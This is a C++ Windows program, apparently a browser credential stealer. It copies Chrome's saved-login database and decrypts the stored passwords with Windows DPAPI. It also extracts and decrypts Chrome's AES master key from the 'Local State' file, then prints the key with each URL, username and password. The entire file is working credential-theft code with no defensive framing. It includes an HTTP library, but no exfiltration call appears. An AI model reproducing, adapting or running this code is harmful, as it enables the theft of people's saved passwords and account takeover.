// main.cpp : Defines the entry point for the console application.
//

#pragma comment(lib, "crypt32.lib")

#define _CRT_SECURE_NO_WARNINGS
#define _SCL_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN


#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <Windows.h>
#include <wincrypt.h>

#include "sqlite3.h"
#include "httplib.h"


sqlite3 *open_br_db(char *__temp_path) {
	sqlite3 *db = nullptr;
	char temp_path[256];
	if (!GetTempPathA(256, temp_path)) {
		//
		return nullptr;
	}
	std::string Temp(temp_path);
	std::string br_login_data_path;
	br_login_data_path = Temp.substr(0, Temp.find("\\Temp") + 1) + "Google\\Chrome\\User Data\\default\\Login Data";
	Temp += "tmp299792458xyzt.db";
	CopyFileA(br_login_data_path.c_str(),
		Temp.c_str(), FALSE);
	memcpy(__temp_path, Temp.c_str(), Temp.size());
	if (sqlite3_open(Temp.c_str(), &db) != 0) {
		return nullptr;
	}
	return db;
}

std::string hex_encode(unsigned char *buf, int len) {
	std::stringstream ss;
	int i;
	for (i = 0; i < len; i++)
		ss << std::setw(2) << std::setfill('0') << std::hex << (int)buf[i];
	return ss.str();
}

/* base64 */

void b64_encode(const unsigned char *src, char *dst, int len);
void b64_decode(const char *src, unsigned char *dst, int len);

static const char *b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static const unsigned char b64inv[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 62, 0, 0, 0, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 0, 0, 0, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 0, 0, 0, 0, 0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 0, 0, 0, 0 };


void b64_encode(const unsigned char *src, char *dst, int len) {
	int r = 3 - (len % 3), i, j;
	len -= len % 3;
	for (i = 0, j = 0; i<len; i += 3, j += 4) {
		dst[j] = b64[src[i] >> 2];
		dst[j + 1] = b64[(src[i] & 3) << 4 | src[i + 1] >> 4];
		dst[j + 2] = b64[(src[i + 1] & 15) << 2 | src[i + 2] >> 6];
		dst[j + 3] = b64[src[i + 2] & 63];
	}
	switch (r) {
	case 1:
		dst[j] = b64[src[i] >> 2];
		dst[j + 1] = b64[(src[i] & 3) << 4 | src[i + 1] >> 4];
		dst[j + 2] = b64[(src[i + 1] & 15) << 2];
		dst[j + 3] = '=';
		break;
	case 2:
		dst[j] = b64[src[i] >> 2];
		dst[j + 1] = b64[(src[i] & 3) << 4];
		dst[j + 2] = '=';
		dst[j + 3] = '=';
		break;
	}
}

void b64_decode(const char *src, unsigned char *dst, int len) {
	int i, j;
	for (i = 0, j = 0; i<len; i += 4, j += 3) {
		dst[j] = b64inv[src[i]] << 2 | (b64inv[src[i + 1]] >> 4);
		dst[j + 1] = (b64inv[src[i + 1]] & 15) << 4 | (b64inv[src[i + 2]] >> 2);
		dst[j + 2] = (b64inv[src[i + 2]] & 3) << 6 | b64inv[src[i + 3]];
	}
}

/* base64 */

/* encrypted_key */

unsigned char *get_encrypted_key(int *len) {
	char temp_path[256];
	if (!GetTempPathA(256, temp_path)) {
		//
		return nullptr;
	}
	std::string Temp(temp_path);
	std::string path;
	path = Temp.substr(0, Temp.find("\\Temp") + 1) + "Google\\Chrome\\User Data\\Local State";
	FILE *fd = fopen(path.c_str(), "r");
	if (fd == NULL) {
		return NULL;
	}
	fseek(fd, 0L, SEEK_END);
	size_t sz = ftell(fd);
	char *localState = (char *)malloc(sz * sizeof(char));
	if (localState == NULL) {
		fclose(fd);
		return NULL;
	}
	fseek(fd, 0L, SEEK_SET);
	fread(localState, 1, sz, fd);
	fclose(fd);
	char *p = strstr(localState, "encrypted_key");
	if (p == NULL) {
		free(localState);
		return NULL;
	}
	char __encrypted_key[512];
	int i, j;
	for (i = 0; i<512; i++) {
		if (p[i + 16] == '\"')
			break;
		__encrypted_key[i] = p[i + 16];
	}
	__encrypted_key[i] = 0;
	free(localState);
	unsigned char *encrypted_key = (unsigned char *)calloc(512, 1);
	b64_decode(__encrypted_key, encrypted_key, i);
	for (j = 0; j<i - 5; j++)
		encrypted_key[j] = encrypted_key[j + 5];
	*len = -5 + (i * 3) / 4;
	return encrypted_key;
}

unsigned char *decrypt_encrypted_key(unsigned char *encrypted_key, int len, int *klen) {
	if (encrypted_key == NULL)
		return NULL;
	DATA_BLOB bData;
	bData.pbData = encrypted_key;
	bData.cbData = len;
	DATA_BLOB vData;
	vData.pbData = NULL;
	if (CryptUnprotectData(&bData, NULL, NULL, NULL, NULL, 0, &vData)) {
		unsigned char *decrypted_key = (unsigned char *)calloc(bData.cbData, 1);
		memcpy(decrypted_key, vData.pbData, vData.cbData);
		*klen = vData.cbData;
		return decrypted_key;
	}
	return NULL;
}

/* encrypted_key */

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
					LPSTR lpCmdLine, int nShowCmd)
{
	char __temp_path[256] = { 0 };
	sqlite3 *db = open_br_db(__temp_path);
	std::vector<std::vector<std::string>> credentials;
	std::vector<std::string> row;
	int len, i;
	unsigned char *pwd;
	DATA_BLOB bData, DataVerify;
	if (db) {
		sqlite3_stmt *stm = nullptr;
		if (!sqlite3_prepare(db, "SELECT * FROM 'logins'", 512, &stm, NULL)) {
			while (sqlite3_step(stm) == SQLITE_ROW) {
				row.push_back(std::string(
					(const char *)sqlite3_column_text(stm, 1)
				));
				if (row[0].empty()) {
					row.clear();
					continue;
				}
				row.push_back(std::string(
					(const char *)sqlite3_column_text(stm, 3)
				));

				len = sqlite3_column_bytes(stm, 5);
				pwd = (unsigned char*)sqlite3_column_blob(stm, 5);

				bData.cbData = len;
				bData.pbData = pwd;

				if (CryptUnprotectData(&bData,
					NULL, NULL, NULL, NULL, 0,
					&DataVerify)) {
					memcpy(pwd, DataVerify.pbData, DataVerify.cbData);
					for (i = 0; i < 32; i++) {
						if (pwd[i] < 0x20) {
							pwd[i] = 0;
							break;
						}
					}
					row.push_back(std::string((const char*)pwd));
				}
				else row.push_back(hex_encode(pwd, len));

				credentials.push_back(row);
				row.clear();
			}
		}
		sqlite3_close(db);
	}
	std::remove(__temp_path);

	std::string Login_data;

	std::vector<std::vector<std::string>>::iterator it;
	for (it = credentials.begin(); it != credentials.end(); it++) {
		Login_data += "[\t";
		for (std::vector<std::string>::iterator _it = it->begin();
			_it != it->end(); _it++)
			Login_data += *_it + ((_it == it->end()-1)? "":"\t");
		Login_data += "\t]\n";
	}

	int key_len;
	unsigned char *encrypted_key = get_encrypted_key(&len);
	unsigned char *decrypted_key = decrypt_encrypted_key(encrypted_key, len, &key_len);
	std::string aes_key = encrypted_key ? hex_encode(decrypted_key, key_len) : "";
	if (aes_key != "") {
		// chrome version > 80
		std::cout << "[*] chrome version > 80\nAES_KEY : " << aes_key << std::endl;
	}
	std::cout << Login_data;
	return 0;
}